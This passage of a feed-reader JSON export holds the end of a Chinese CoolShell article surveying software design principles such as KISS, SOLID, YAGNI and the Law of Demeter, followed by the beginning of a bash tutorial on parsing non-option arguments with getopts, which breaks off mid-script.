href=\"http://coolshell.cn/articles/3872.html\">新浪的网页</a>）者是负面的例子。“宜家”（IKEA）简约、效率的家居设计、生产思路；“微软”（Microsoft）“所见即所得”的理念；“谷歌”（Google)简约、直接的商业风格，无一例外的遵循了“kiss”原则，也正是“kiss”原则，成就了这些看似神奇的商业经典。而苹果公司的iPhone/iPad将这个原则实践到了极至。</p>\n<p><span></span></p>\n<p>把一个事情搞复杂是一件简单的事，但要把一个复杂的事变简单，这是一件复杂的事。</p>\n<p><strong>参考</strong>：<a title=\"http://en.wikipedia.org/wiki/KISS_principle\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/KISS_principle\">http://en.wikipedia.org/wiki/KISS_principle</a></p>\n<h4>Program to an interface, not an implementation</h4>\n<p>这是设计模式中最根本的哲学，注重接口，而不是实现，依赖接口，而不是实现。接口是抽象是稳定的，实现则是多种多样的。以后面我们会面向对象的SOLID原则中会提到我们的依赖倒置原则，就是这个原则的的另一种样子。还有一条原则叫 <strong>Composition over inheritance</strong>（喜欢组合而不是继承），这两条是那23个经典设计模式中的设计原则。</p>\n<h4>Command-Query Separation (CQS)  – 命令-查询分离原则</h4>\n<ul>\n<li>查询：当一个方法返回一个值来回应一个问题的时候，它就具有查询的性质；</li>\n<li>命令：当一个方法要改变对象的状态的时候，它就具有命令的性质；</li>\n</ul>\n<p>通常，一个方法可能是纯的Command模式或者是纯的Query模式，或者是两者的混合体。在设计接口时，如果可能，应该尽量使接口单一化，保证方法的行为严格的是命令或者是查询，这样查询方法不会改变对象的状态，没有副作用，而会改变对象的状态的方法不可能有返回值。也就是说：如果我们要问一个问题，那么就不应该影响到它的答案。实际应用，要视具体情况而定，语义的清晰性和使用的简单性之间需要权衡。将Command和Query功能合并入一个方法，方便了客户的使用，但是，降低了清晰性，而且，可能不便于基于断言的程序设计并且需要一个变量来保存查询结果。</p>\n<p>在系统设计中，很多系统也是以这样原则设计的，查询的功能和命令功能的系统分离，这样有则于系统性能，也有利于系统的安全性。</p>\n<p><strong>参考</strong>：<a title=\"http://en.wikipedia.org/wiki/Command-query_separation\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/Command-query_separation\">http://en.wikipedia.org/wiki/Command-query_separation</a></p>\n<h4>You Ain’t Gonna Need It (YAGNI)</h4>\n<p>这个原则简而言之为——只考虑和设计必须的功能，避免过度设计。只实现目前需要的功能，在以后您需要更多功能时，可以再进行添加。</p>\n<ul>\n<li>如无必要，勿增复杂性。</li>\n<li>软件开发先是一场沟通博弈。</li>\n</ul>\n<p>以前本站有一篇关于<a title=\"代码重构的一个示例\" href=\"http://coolshell.cn/articles/3005.html\">过度重构的文章</a>，这个示例就是这个原则的反例。而，WebSphere的设计者就<a href=\"http://www.bbc.co.uk/news/business-11944966\">表示过他过度设计了这个产品</a>。我们的程序员或是架构师在设计系统的时候，会考虑很多扩展性的东西，导致在架构与设计方面使用了大量折衷，最后导致项目失败。这是个令人感到讽刺的教训，因为本来希望尽可能延长项目的生命周期，结果反而缩短了生命周期。</p>\n<p><strong>参考</strong>：<a title=\"http://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It\">http://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It</a></p>\n<h4>Law of Demeter – 迪米特法则</h4>\n<p>迪米特法则(Law of Demeter)，又称“最少知识原则”（Principle of Least Knowledge），其来源于1987年荷兰大学的一个叫做Demeter的项目。Craig Larman把Law of Demeter又称作“不要和陌生人说话”。在《程序员修炼之道》中讲LoD的那一章叫作“解耦合与迪米特法则”。关于迪米特法则有一些很形象的比喻：</p>\n<ul>\n<li>如果你想让你的狗跑的话，你会对狗狗说还是对四条狗腿说？</li>\n<li>如果你去店里买东西，你会把钱交给店员，还是会把钱包交给店员让他自己拿？</li>\n</ul>\n<p>和狗的四肢说话？让店员自己从钱包里拿钱？这听起来有点荒唐，不过在我们的代码里这几乎是见怪不怪的事情了。</p>\n<p>对于LoD，正式的表述如下：</p>\n<blockquote><p>对于对象 ‘O’ 中一个方法’M&#39;，M应该只能够访问以下对象中的方法：</p>\n<ol>\n<li>对象O；</li>\n<li>与O直接相关的Component Object；</li>\n<li>由方法M创建或者实例化的对象；</li>\n<li>作为方法M的参数的对象。</li>\n</ol>\n</blockquote>\n<p>在《Clean Code》一书中，有一段Apache framework中的一段违反了LoD的代码：</p>\n<p style=\"padding-left:30px\">final String outputDir = ctxt.getOptions().getScratchDir().getAbsolutePath();</p>\n<p>这么长的一串对其它对象的细节，以及细节的细节，细节的细节的细节……的调用，增加了耦合，使得代码结构复杂、僵化，难以扩展和维护。</p>\n<p>在《重构》一书中的代码的环味道中有一种叫做“Feature Envy”(依恋情结），形象的描述了一种违反了LoC的情况。Feature Envy就是说一个对象对其它对象的内容更有兴趣，也就是说老是羡慕别的对象的成员、结构或者功能，大老远的调用人家的东西。这样的结构显然是不合理的。我们的程序应该写得比较“害羞”。不能像前面例子中的那个不把自己当外人的店员一样，拿过客人的钱包自己把钱拿出来。“害羞”的程序只和自己最近的朋友交谈。这种情况下应该调整程序的结构，让那个对象自己拥有它羡慕的feature，或者使用合理的设计模式（例如Facade和Mediator）。</p>\n<p><strong>参考</strong>：<a title=\"http://en.wikipedia.org/wiki/Principle_of_Least_Knowledge\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/Principle_of_Least_Knowledge\">http://en.wikipedia.org/wiki/Principle_of_Least_Knowledge</a></p>\n<h4>面向对象的S.O.L.I.D 原则</h4>\n<p>一般来说这是面向对象的五大设计原则，但是，我觉得这些原则可适用于所有的软件开发。</p>\n<p><strong>Single Responsibility Principle (SRP) – 职责单一原则</strong></p>\n<p>关于单一职责原则，其核心的思想是：<strong>一个类，只做一件事，并把这件事做好，其只有一个引起它变化的原因</strong>。单一职责原则可以看作是低耦合、高内聚在面向对象原则上的引申，将职责定义为引起变化的原因，以提高内聚性来减少引起变化的原因。职责过多，可能引起它变化的原因就越多，这将导致职责依赖，相互之间就产生影响，从而极大的损伤其内聚性和耦合度。单一职责，通常意味着单一的功能，因此不要为一个模块实现过多的功能点，以保证实体只有一个引起它变化的原因。</p>\n<ul>\n<li>Unix/Linux是这一原则的完美体现者。各个程序都独立负责一个单一的事。</li>\n<li>Windows是这一原则的反面示例。几乎所有的程序都交织耦合在一起。</li>\n</ul>\n<p><strong>Open/Closed Principle (OCP) – 开闭原则</strong></p>\n<p>关于开发封闭原则，其核心的思想是：模块是可扩展的，而不可修改的。也就是说，<strong>对扩展是开放的，而对修改是封闭的</strong>。</p>\n<ul>\n<li>对扩展开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。</li>\n<li>对修改封闭，意味着类一旦设计完成，就可以独立完成其工作，而不要对类进行任何修改。</li>\n</ul>\n<p>对于面向对象来说，需要你依赖抽象，而不是实现，23个经典设计模式中的“策略模式”就是这个实现。对于非面向对象编程，一些API需要你传入一个你可以扩展的函数，比如我们的C 语言的qsort()允许你提供一个“比较器”，STL中的容器类的内存分配，ACE中的多线程的各种锁。对于软件方面，浏览器的各种插件属于这个原则的实践。</p>\n<p><strong>Liskov substitution principle (LSP) – 里氏代换原则</strong></p>\n<p>软件工程大师Robert C. Martin把里氏代换原则最终简化为一句话：“Subtypes must be substitutable for their base types”。也就是，子类必须能够替换成它们的基类。即：子类应该可以替换任何基类能够出现的地方，并且经过替换以后，代码还能正常工作。另外，不应该在代码中出现if/else之类对子类类型进行判断的条件。里氏替换原则LSP是使代码符合开闭原则的一个重要保证。正是由于子类型的可替换性才使得父类型的模块在无需修改的情况下就可以扩展。</p>\n<p>这么说来，似乎有点教条化，我非常建议大家看看这个原则个两个最经典的案例——“正方形不是长方形”和“鸵鸟不是鸟”。通过这两个案例，你会明白《墨子 小取》中说的 ——“娣，美人也，爱娣，非爱美人也….盗，人也；恶盗，非恶人也。”——妹妹虽然是美人，但喜欢妹妹并不代表喜欢美人。盗贼是人，但讨厌盗贼也并不代表就讨厌人类。<strong>这个原则让你考虑的不是语义上对象的间的关系，而是实际需求的环境</strong>。</p>\n<p>在很多情况下，在设计初期我们类之间的关系不是很明确，LSP则给了我们一个判断和设计类之间关系的基准：需不需要继承，以及怎样设计继承关系。</p>\n<p><strong>Interface Segregation Principle (ISP) – 接口隔离原则</strong></p>\n<p>接口隔离原则意思是把功能实现在接口中，而不是类中，使用多个专门的接口比使用单一的总接口要好。</p>\n<p>举个例子，我们对电脑有不同的使用方式，比如：写作，通讯，看电影，打游戏，上网，编程，计算，数据等，如果我们把这些功能都声明在电脑的抽类里面，那么，我们的上网本，PC机，服务器，笔记本的实现类都要实现所有的这些接口，这就显得太复杂了。所以，我们可以把其这些功能接口隔离开来，比如：工作学习接口，编程开发接口，上网娱乐接口，计算和数据服务接口，这样，我们的不同功能的电脑就可以有所选择地继承这些接口。</p>\n<p>这个原则可以提升我们“搭积木式”的软件开发。对于设计来说，Java中的各种Event Listener和Adapter，对于软件开发来说，不同的用户权限有不同的功能，不同的版本有不同的功能，都是这个原则的应用。</p>\n<p><strong>Dependency Inversion Principle (DIP) – 依赖倒置原则</strong></p>\n<p>高层模块不应该依赖于低层模块的实现，而是依赖于高层抽象。</p>\n<p>举个例子，墙面的开关不应该依赖于电灯的开关实现，而是应该依赖于一个抽象的开关的标准接口，这样，当我们扩展程序的时候，我们的开关同样可以控制其它不同的灯，甚至不同的电器。也就是说，电灯和其它电器继承并实现我们的标准开关接口，而我们的开关产商就可不需要关于其要控制什么样的设备，只需要关心那个标准的开关标准。这就是依赖倒置原则。</p>\n<p>这就好像浏览器并不依赖于后面的web服务器，其只依赖于HTTP协议。这个原则实在是太重要了，社会的分工化，标准化都是这个设计原则的体现。</p>\n<p><strong>参考</strong>：<a href=\"http://en.wikipedia.org/wiki/Solid_(object-oriented_design)\">http://en.wikipedia.org/wiki/Solid_(object-oriented_design)</a></p>\n<h4>Common Closure Principle（CCP）– 共同封闭原则</h4>\n<p>一个包中所有的类应该对同一种类型的变化关闭。一个变化影响一个包，便影响了包中所有的类。一个更简短的说法是：一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。CCP原则就是把因为某个同样的原因而需要修改的所有类组合进一个包里。如果2个类从物理上或者从概念上联系得非常紧密，它们通常一起发生改变，那么它们应该属于同一个包。</p>\n<p>CCP延伸了开闭原则（OCP）的“关闭”概念，当因为某个原因需要修改时，把需要修改的范围限制在一个最小范围内的包里。</p>\n<p><strong>参考</strong>：<a href=\"http://c2.com/cgi/wiki?CommonClosurePrinciple\">http://c2.com/cgi/wiki?CommonClosurePrinciple</a></p>\n<h4>Common Reuse Principle (CRP) – 共同重用原则</h4>\n<p>包的所有类被一起重用。如果你重用了其中的一个类，就重用全部。换个说法是，没有被一起重用的类不应该被组合在一起。CRP原则帮助我们决定哪些类应该被放到同一个包里。依赖一个包就是依赖这个包所包含的一切。当一个包发生了改变，并发布新的版本，使用这个包的所有用户都必须在新的包环境下验证他们的工作，即使被他们使用的部分没有发生任何改变。因为如果包中包含有未被使用的类，即使用户不关心该类是否改变，但用户还是不得不升级该包并对原来的功能加以重新测试。</p>\n<p>CCP则让系统的维护者受益。CCP让包尽可能大（CCP原则加入功能相关的类），CRP则让包尽可能小（CRP原则剔除不使用的类）。它们的出发点不一样，但不相互冲突。</p>\n<p><strong>参考</strong>：<a href=\"http://c2.com/cgi/wiki?CommonReusePrinciple\">http://c2.com/cgi/wiki?CommonReusePrinciple</a></p>\n<h4>Hollywood Principle – 好莱坞原则</h4>\n<p>好莱坞原则就是一句话——“don’t call us, we’ll call you.”。意思是，好莱坞的经纪人们不希望你去联系他们，而是他们会在需要的时候来联系你。也就是说，所有的组件都是被动的，所有的组件初始化和调用都由容器负责。组件处在一个容器当中，由容器负责管理。</p>\n<p>简单的来讲，就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。这也就是所谓“控制反转”的概念所在：</p>\n<ol>\n<li>不创建对象，而是描述创建对象的方式。</li>\n<li>在代码中，对象与服务没有直接联系，而是容器负责将这些联系在一起。</li>\n</ol>\n<p>控制权由应用代码中转到了外部容器，控制权的转移，是所谓反转。</p>\n<p>好莱坞原则就是IoC（Inversion of Control）或DI（Dependency Injection ）的基础原则。这个原则很像依赖倒置原则，依赖接口，而不是实例，但是这个原则要解决的是怎么把这个实例传入调用类中？你可能把其声明成成员，你可以通过构造函数，你可以通过函数参数。但是 IoC可以让你通过配置文件，一个由Service Container 读取的配置文件来产生实际配置的类。但是程序也有可能变得不易读了，程序的性能也有可能还会下降。</p>\n<p><strong>参考</strong>：</p>\n<ul>\n<li><a href=\"http://en.wikipedia.org/wiki/Hollywood_Principle\">http://en.wikipedia.org/wiki/Hollywood_Principle</a></li>\n<li><a href=\"http://en.wikipedia.org/wiki/Inversion_of_Control\">http://en.wikipedia.org/wiki/Inversion_of_Control</a></li>\n</ul>\n<h4>High Cohesion &amp; Low/Loose coupling &amp; – 高内聚， 低耦合</h4>\n<p>这个原则是UNIX操作系统设计的经典原则，把模块间的耦合降到最低，而努力让一个模块做到精益求精。</p>\n<ul>\n<li>内聚：一个模块内各个元素彼此结合的紧密程度</li>\n<li>耦合：一个软件结构内不同模块之间互连程度的度量</li>\n</ul>\n<p>内聚意味着重用和独立，耦合意味着多米诺效应牵一发动全身。</p>\n<p><strong>参考</strong>：</p>\n<ul>\n<li><a title=\"http://en.wikipedia.org/wiki/Coupling_(computer_science)\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/Coupling_%28computer_science%29\">http://en.wikipedia.org/wiki/Coupling_(computer_science)</a></li>\n<li><a title=\"http://en.wikipedia.org/wiki/Cohesion_(computer_science)\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/Cohesion_%28computer_science%29\">http://en.wikipedia.org/wiki/Cohesion_(computer_science)</a></li>\n</ul>\n<h4>Convention over Configuration（CoC）– 惯例优于配置原则</h4>\n<p>简单点说，就是将一些公认的配置方式和信息作为内部缺省的规则来使用。例如，Hibernate的映射文件，如果约定字段名和类属性一致的话，基本上就可以不要这个配置文件了。你的应用只需要指定不convention的信息即可，从而减少了大量convention而又不得不花时间和精力啰里啰嗦的东东。配置文件很多时候相当的影响开发效率。</p>\n<p>Rails 中很少有配置文件（但不是没有，数据库连接就是一个配置文件），Rails 的fans号称期开发效率是 java 开发的 10 倍，估计就是这个原因。Maven也使用了CoC原则，当你执行mvn -compile命令的时候，不需要指源文件放在什么地方，而编译以后的class文件放置在什么地方也没有指定，这就是CoC原则。</p>\n<p><strong>参考</strong>：<a title=\"http://en.wikipedia.org/wiki/Convention_over_Configuration\" rel=\"nofollow\" href=\"http://en.wikipedia.org/wiki/Convention_over_Configuration\">http://en.wikipedia.org/wiki/Convention_over_Configuration</a></p>\n<h4>Separation of Concerns (SoC) – 关注点分离</h4>\n<p>SoC 是计算机科学中最重要的努力目标之一。这个原则，就是在软件开发中，通过各种手段，将问题的各个关注点分开。如果一个问题能分解为独立且较小的问题，就是相对较易解决的。问题太过于复杂，要解决问题需要关注的点太多，而程序员的能力是有限的，不能同时关注于问题的各个方面。正如程序员的记忆力相对于计算机知识来说那么有限一样，程序员解决问题的能力相对于要解决的问题的复杂性也是一样的非常有限。在我们分析问题的时候，如果我们把所有的东西混在一起讨论，那么就只会有一个结果——乱。</p>\n<p>我记得在上一家公司有一个项目，讨论就讨论了1年多，项目本来不复杂，但是没有使用SoC，全部的东西混为一谈，再加上一堆程序员注入了各种不同的观点和想法，整个项目一下子就失控了。最后，本来一个1年的项目做了3年。</p>\n<p>实现关注点分离的方法主要有两种，一种是标准化，另一种是抽象与包装。标准化就是制定一套标准，让使用者都遵守它，将人们的行为统一起来，这样使用标准的人就不用担心别人会有很多种不同的实现，使自己的程序不能和别人的配合。Java EE就是一个标准的大集合。每个开发者只需要关注于标准本身和他所在做的事情就行了。就像是开发镙丝钉的人只专注于开发镙丝钉就行了，而不用关注镙帽是怎么生产的，反正镙帽和镙丝钉按标来就一定能合得上。不断地把程序的某些部分抽像差包装起来，也是实现关注点分离的好方法。一旦一个函数被抽像出来并实现了，那么使用函数的人就不用关心这个函数是如何实现的，同样的，一旦一个类被抽像并实现了，类的使用者也不用再关注于这个类的内部是如何实现的。诸如组件，分层，面向服务，等等这些概念都是在不同的层次上做抽像和包装，以使得使用者不用关心它的内部实现细节。</p>\n<p>说白了还是“高内聚，低耦合”。</p>\n<p><strong>参考</strong>：<a href=\"http://sulong.me/archives/99\">http://sulong.me/archives/99</a></p>\n<h4>Design by Contract (DbC) – 契约式设计</h4>\n<p>DbC的核心思想是对软件系统中的元素之间相互合作以及“责任”与“义务”的比喻。这种比喻从商业活动中“客户”与“供应商”达成“契约”而得来。例如：</p>\n<ul>\n<li>供应商必须提供某种产品（责任），并且他有权期望客户已经付款（权利）。</li>\n<li>客户必须付款（责任），并且有权得到产品（权利）。</li>\n<li>契约双方必须履行那些对所有契约都有效的责任，如法律和规定等。</li>\n</ul>\n<p>同样的，如果在程序设计中一个模块提供了某种功能，那么它要：</p>\n<ul>\n<li>期望所有调用它的客户模块都保证一定的进入条件：这就是模块的先验条件（客户的义务和供应商的权利，这样它就不用去处理不满足先验条件的情况）。</li>\n<li>保证退出时给出特定的属性：这就是模块的后验条件——（供应商的义务，显然也是客户的权利）。</li>\n<li>在进入时假定，并在退出时保持一些特定的属性：不变式。</li>\n</ul>\n<p>契约就是这些权利和义务的正式形式。我们可以用“三个问题”来总结DbC，并且作为设计者要经常问：</p>\n<ul>\n<li>它期望的是什么？</li>\n<li>它要保证的是什么？</li>\n<li>它要保持的是什么？</li>\n</ul>\n<p>根据Bertrand Meyer氏提出的DBC概念的描述，对于类的一个方法，都有一个前提条件以及一个后续条件，前提条件说明方法接受什么样的参数数据等，只有前提条件得到满足时，这个方法才能被调用；同时后续条件用来说明这个方法完成时的状态，如果一个方法的执行会导致这个方法的后续条件不成立，那么这个方法也不应该正常返回。</p>\n<p>现在把前提条件以及后续条件应用到继承子类中，子类方法应该满足：</p>\n<ol>\n<li>前提条件不强于基类．</li>\n<li>后续条件不弱于基类．</li>\n</ol>\n<p>换句话说，通过基类的接口调用一个对象时，用户只知道基类前提条件以及后续条件。因此继承类不得要求用户提供比基类方法要求的更强的前提条件，亦即，继承类方法必须接受任何基类方法能接受的任何条件（参数）。同样，继承类必须顺从基类的所有后续条件，亦即，继承类方法的行为和输出不得违反由基类建立起来的任何约束，不能让用户对继承类方法的输出感到困惑。</p>\n<p>这样，我们就有了基于契约的LSP，基于契约的LSP是LSP的一种强化。</p>\n<p><strong>参考</strong>：<a href=\"http://en.wikipedia.org/wiki/Design_by_contract\">http://en.wikipedia.org/wiki/Design_by_contract</a></p>\n<h4>Acyclic Dependencies Principle (ADP) – 无环依赖原则</h4>\n<p>包之间的依赖结构必须是一个直接的无环图形，也就是说，在依赖结构中不允许出现环（循环依赖）。如果包的依赖形成了环状结构，怎么样打破这种循环依赖呢？有2种方法可以打破这种循环依赖关系：第一种方法是创建新的包，如果A、B、C形成环路依赖，那么把这些共同类抽出来放在一个新的包D里。这样就把C依赖A变成了C依赖D以及A依赖D，从而打破了循环依赖关系。第二种方法是使用DIP（依赖倒置原则）和ISP（接口分隔原则）设计原则。</p>\n<p>无环依赖原则（ADP）为我们解决包之间的关系耦合问题。在设计模块时，不能有循环依赖。</p>\n<p><strong>参考</strong>：<a href=\"http://c2.com/cgi/wiki?AcyclicDependenciesPrinciple\">http://c2.com/cgi/wiki?AcyclicDependenciesPrinciple</a></p>\n<h4>————————————————————————————</h4>\n<p>上面这些原则可能有些学院派，也可能太为理论，我在这里说的也比较模糊和简单，这里只是给大家一个概貌，如果想要了解更多的东西，大家可以多google一下。</p>\n<p>不过这些原则看上去都不难，但是要用好却并不那么容易。要能把这些原则用得好用得精，而不教条，我的经验如下：（我以为这是一个理论到应用的过程）</p>\n<ol>\n<li>你可以先粗浅或是表面地知道这些原则。</li>\n<li>但不要急着马上就使用。</li>\n<li>在工作学习中观察和总结别人或自己的设计。</li>\n<li>再回过头来了回顾一下这些原则，相信你会有一些自己的心得。</li>\n<li>有适度地去实践一下。</li>\n<li>Goto第 3步。</li>\n</ol>\n<p>我相信可能还会有其实一些原则，欢迎大家提供。</p>\n<p>（全文完）</p>\n<h3>相关文章</h3><ul><li>2010年09月29日 -- <a href=\"http://coolshell.cn/articles/3036.html\" title=\"面向对象是个骗局？！\">面向对象是个骗局？！</a></li><li>2011年06月10日 -- <a href=\"http://coolshell.cn/articles/4811.html\" title=\"软件真的好难做啊\">软件真的好难做啊</a></li><li>2011年05月03日 -- <a href=\"http://coolshell.cn/articles/4626.html\" title=\"读书笔记：对线程模型的批评\">读书笔记：对线程模型的批评</a></li><li>2011年04月28日 -- <a href=\"http://coolshell.cn/articles/4605.html\" title=\"Amazon的书为什么卖到了$2000万\">Amazon的书为什么卖到了$2000万</a></li><li>2011年04月27日 -- <a href=\"http://coolshell.cn/articles/4576.html\" title=\"Linux 2.6.39-rc3的一个插曲\">Linux 2.6.39-rc3的一个插曲</a></li><li>2011年03月29日 -- <a href=\"http://coolshell.cn/articles/4102.html\" title=\"如何学好C语言\">如何学好C语言</a></li><li>2011年03月28日 -- <a href=\"http://coolshell.cn/articles/4077.html\" title=\"纯文本配置还是注册表\">纯文本配置还是注册表</a></li></ul>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1303746444738",
    "timestampUsec" : "1303746444738902",
    "id" : "tag:google.com,2005:reader/item/b90f309302ec8b81",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/like", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Linux技巧", "脚本" ],
    "title" : "Bash里使用getopts解析非选项参数",
    "published" : 1303384891,
    "updated" : 1303384891,
    "alternate" : [ {
      "href" : "http://yegle.net/2011/04/21/parsing-non-option-argument-bash-getopts/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>getopts是一个Bash built-in，可以用它来实现与getopt(3)一致的参数解析功能。</p>\n<p>注意它和getopt(1)的区别。getopt是一个单独的命令，而getopts是bash内置命令。</p>\n<p>关于option与argument的区别，我这里实在给不出准确的定义，只能根据自己的理解试着解释一下。</p>\n<p>argument是通常所说的命令行参数，在C语言里就是argv数组，根据参数出现的顺序从argv[1]开始依次递增（argv[0]里是被执行的程序本身的程序名）。在Bash里，$0表示脚本的名称，$1开始往后是各个argument。</p>\n<p>option有点混乱。我的理解是：一个Option是以<code>-</code>（hyphen-minus character）或<code>--</code>开头的字符串，它后面有可选的argument，如果有则只有一个。也就是说，一个option由一个或两个argument组成</p>\n<p>根据上面的描述命令行参数（Arguments）可以分为3类（抱歉我这里会用比较山寨的方法来描述这三类，如果有对应的标准名称，请留言指出）</p>\n<ol>\n<li>Option with an argument：例如wget的-O选项，必须要指定一个路径或文件名作为参数</li>\n<li>Option without an argument：看到网上有的地方也称为switcher，开关选项。例如wget的-v和-q选项，可以使程序输出信息为verbose（详尽）或quiet（安静）</li>\n<li>Non-option argument：其实根据上面的描述，这个第三类有点尴尬：它不符合我定义的Option。例子就是wget命令指定文件的URL，它的前面并没有对应的-开头的字符串。</li>\n</ol>\n<p>getopts的基本用法类似下面的例子：</p>\n\n<div><div><pre style=\"font-family:monospace\"><span style=\"color:#000000;font-weight:bold\">while</span> <span style=\"color:#7a0874;font-weight:bold\">getopts</span> :s:h opt\n<span style=\"color:#000000;font-weight:bold\">do</span>  \n    <span style=\"color:#000000;font-weight:bold\">case</span> <span style=\"color:#007800\">$opt</span> <span style=\"color:#000000;font-weight:bold\">in</span>\n        s<span style=\"color:#7a0874;font-weight:bold\">)</span>  \n            <span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#ff0000\">&quot;-s=<span style=\"color:#007800\">$OPTARG</span>&quot;</span>\n            <span style=\"color:#000000;font-weight:bold\">;;</span>\n        :<span style=\"color:#7a0874;font-weight:bold\">)</span>\n            <span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#ff0000\">&quot;-<span style=\"color:#007800\">$OPTARG</span> needs an argument&quot;</span>\n            <span style=\"color:#000000;font-weight:bold\">;;</span>                                                                                 \n        h<span style=\"color:#7a0874;font-weight:bold\">)</span>  \n            <span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#ff0000\">&quot;-h is set&quot;</span>\n            <span style=\"color:#000000;font-weight:bold\">;;</span>\n        <span style=\"color:#000000;font-weight:bold\">*</span><span style=\"color:#7a0874;font-weight:bold\">)</span>  \n            <span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#ff0000\">&quot;-<span style=\"color:#007800\">$opt</span> not recognized&quot;</span>\n            <span style=\"color:#000000;font-weight:bold\">;;</span>\n    <span style=\"color:#000000;font-weight:bold\">esac</span>\n<span style=\"color:#000000;font-weight:bold\">done</span></pre></div></div>\n\n<p>这个例子中，定义了一个optstring（<code>:s:h</code>）。其中第一个<code>:</code>字符，打开了getopts的silent模式，可以自行对未识别的选项进行处理而不是让getopts自己报错。随后的<code>s:</code>定义了一个带参数的选项，如果-s使用时没有带上对应的argument则可以在随后的case语句中做相应的报错处理。最后的<code>h</code>定义了一个不带参数的选项。getopts的使用基本就是这样了，更详尽的getopts的optstring的定义和使用请参考bash(1)</p>\n<p>上面的例子里我没有给出如何解析非选项参数（Non-option argument）。如果我执行<code>./test.sh -s test_string -h filename</code>，那么仅靠getopts是无法获取到filename这个字符串的。</p>\n<p>仔细阅读bash(1)之后就会发现，getopts在访问到第一个non-option argument的时候即会停止解析，并设置<code>$OPTIND</code>为第一个non-option argument在$@中的指针。例如上面这个<code>./test.sh -s test_string -h filename</code>例子，getopts解析完之后会将<code>$OPTIND</code>设置为4。</p>\n<p>结合$OPTIND变量和shift这个bash built-in，可以写出一个完整的解析所有参数的脚本。以下是一个例子，已经有恰当的注释信息，应该不需要额外解释了。：</p>\n\n<div><div><pre style=\"font-family:monospace\"><span style=\"color:#666666;font-style:italic\">#!/bin/bash</span>\n \n<span style=\"color:#7a0874;font-weight:bold\">declare</span> <span style=\"color:#660033\">-a</span> NOA <span style=\"color:#666666;font-style:italic\"># Array used to store non-option argument</span>\n \n<span style=\"color:#000000;font-weight:bold\">while</span> <span style=\"color:#7a0874;font-weight:bold\">[</span> <span style=\"color:#007800\">$#</span> <span style=\"color:#660033\">-ne</span> <span style=\"color:#000000\">0</span> <span style=\"color:#7a0874;font-weight:bold\">]</span>\n<span style=\"color:#000000;font-weight:bold\">do</span>\n    <span style=\"color:#666666;font-style:italic\"># if OPTIND &gt; $#+1, getopts will not change OPTIND&#39;s value,so set it to 0</span>\n    <span style=\"color:#007800\">OPTIND</span>=<span style=\"color:#000000\">0</span>\n    <span style=\"color:#000000;font-weight:bold\">while</span> <span style=\"color:#7a0874;font-weight:bold\">getopts</span> :s: opt\n    <span style=\"color:#000000;font-weight:bold\">do</span>\n        <span style=\"color:#000000;font-weight:bold\">case</span> <span style=\"color:#007800\">$opt</span> <span style=\"color:#000000;font-weight:bold\">in</span>\n            s<span style=\"color:#7a0874;font-weight:bold\">)</span>\n            <span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#ff0000\">&quot;-s=<span style=\"color:#007800\">$OPTARG</span>&quot;</span>\n            <span style=\"color:#000000;font-weight:bold\">;;</span>\n            \\?<span style=\"color:#7a0874;font-weight:bold\">)</span>\n            <span style=\"color:#7a0874;font-weight:bold\">echo</span> <span style=\"color:#ff0000\">&quot;-<span style=\"color:#007800\">$OPTARG</span> not recognized&quot;</span>\n            <span style=\"color:#000000;font-weight:bold\">;;</span>\n        <span style=\"color:#000000;font-weight:bold\">esac</span>\n    <span style=\"color:#000000;font-weight:bold\">done</span>\n \n    <span style=\"color:#666666;font-style:italic\"># if getopts find a non-option argument</span>\n    <span style=\"color:#666666;font-style:italic\"># it will stop parsing and return OPTIND</span>\n    <span style=\"color:#666666;font-style:italic\"># as index to the first non-option argument</span>\n    <span style=\"color:#666666;font-style:italic\"># </span>\n    <span style=\"color:#666666;font-style:italic\"># if getopts doesn't find any non-option argument</span>\n    <span style=\"color:#666666;font-style:italic\"># it will set OPTIND=$#+1</span>\n    <span style=\"color:#000000;font-weight:bold\">if</span> <span style=\"color:#7a0874;font-weight:bold\">[</span> <span style=\"color:#007800\">$OPTIND</span> <span style=\"color:#660033\">-ne</span> $<span style=\"color:#7a0874;font-weight:bold\">(</span><span style=\"color:#7a0874;font-weight:bold\">(</span><span style=\"color:#007800\">$#</span>+<span style=\"color:#000000\">1</span><span style=\"color:#7a0874;font-weight:bold\">)</span><span style=\"color:#7a0874;font-weight:bold\">)</span> <span style=\"color:#7a0874;font-weight:bold\">]</span>\n    <span style=\"color:#000000;font-weight:bold\">then</span>\n        <span style=\"color:#7a0874;font-weight:bold\">shift</span> $<span style=\"color:#7a0874;font-weight:bold\">(</span><span style=\"color:#7a0874;font-weight:bold\">(</span><span style=\"color:#007800\">$OPTIND</span>-<span style=\"color:#000000\">1</span><span style=\"color:#7a0874;font-weight:bold\">)</span><span style=\"color:#7a0874;font-weight:bold\">)</span>\n        <span style=\"color:#666666;font-style:italic\"># This is just my favorate way to append element to an array in shell.</span>\n        <span style=\"color:#666666;font-style:italic\"># Feel free to change it</span>\n        <span style=\"color:#007800\">NOA</span>=<span 